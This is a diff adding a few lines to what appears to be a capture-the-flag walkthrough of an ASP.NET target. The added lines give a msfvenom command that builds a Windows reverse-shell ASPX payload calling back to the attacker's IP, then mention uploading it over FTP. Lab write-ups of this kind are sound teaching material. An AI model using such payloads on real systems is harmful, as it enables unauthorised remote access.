@@ -50,3 +50,10 @@ As we can see that this is a asp.net website.
 We can now upload our aspx reverse shell on ftp server.  
 But first we have to generate it using **msfvenom**
 
+`msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=4444 -f aspx > shell.aspx`
+
+Now let's upload the aspx shell to ftp.
+
+![](/photos/devel-photos/ftp-shell.png)
+
+
